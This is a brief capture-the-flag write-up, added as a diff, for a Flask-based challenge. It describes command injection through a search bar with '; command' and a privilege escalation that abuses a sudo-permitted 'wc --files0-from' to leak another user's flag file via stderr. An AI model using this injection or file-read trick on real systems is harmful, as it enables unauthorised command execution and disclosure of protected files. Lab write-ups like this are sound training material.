@@ -1,0 +1,31 @@
+## Writeup
+
+1 RECON: 
+
+Throw some stuff into the searchbar
+
+2 RCE:
+
+; partial RCEC
+; command ; complete RCE 
+
+
+3 privesc to Harald 
+
+sudo -l 
+
+/usr/bin/wc 
+
+wc --files0-from $file
+
+sudo -u harald /usr/bin/wc --files0-from /home/harald/flag.txt
+
+no output provided have to redirect STDERR to STDOUT
+
+sudo -u harald /usr/bin/wc --files0-from /home/harald/flag.txt 2>&1;
+
+read haralds flag
+
+## Flagga
+
+Flaggan finns i `flaskjakt/flag.txt`
